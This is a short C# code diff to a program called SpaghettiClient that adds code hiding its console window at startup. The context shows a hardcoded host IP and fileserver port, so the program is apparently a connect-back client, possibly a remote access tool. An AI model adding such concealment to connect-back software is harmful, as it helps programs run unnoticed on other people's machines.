@@ -7,6 +7,13 @@ namespace SpaghettiClient
     {
         static void Main(string[] args)
         {
+            // Hide Console Window
+            const int SW_HIDE = 0;
+
+            IntPtr handle = Utilities.GetConsoleWindow();
+            Utilities.ShowWindow(handle, SW_HIDE);
+
+
             string host = "10.200.32.131"; // change the host ip
             int fs_port = 4443; // change the fileserver port
 
